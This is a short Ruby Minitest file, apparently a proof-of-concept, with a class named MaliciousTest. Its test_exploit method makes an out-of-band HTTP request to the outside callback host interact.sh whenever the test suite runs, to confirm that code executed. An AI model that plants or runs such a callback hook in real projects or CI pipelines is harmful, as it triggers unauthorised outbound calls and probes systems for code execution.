require 'net/http'
require 'uri'

class MaliciousTest < Minitest::Test
  def test_exploit
    # Simple OOB call to verify execution
    uri = URI.parse("http://interact.sh")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Get.new(uri.request_uri)
    response = http.request(request)
    puts "OOB callback made"
  end
end